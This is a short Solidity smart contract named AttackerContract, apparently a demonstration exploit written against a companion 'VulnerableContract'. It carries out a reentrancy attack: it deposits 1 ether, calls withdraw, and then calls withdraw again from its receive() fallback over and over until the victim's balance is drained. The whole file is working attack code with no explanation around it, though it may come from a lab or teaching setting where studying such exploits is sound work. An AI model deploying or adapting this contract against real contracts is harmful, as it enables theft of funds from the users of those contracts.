// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackerContract {
    VulnerableContract public victim;

    constructor(address _victimAddress) {
        victim = VulnerableContract(_victimAddress);
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need atleast 1 Eth to start");

        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
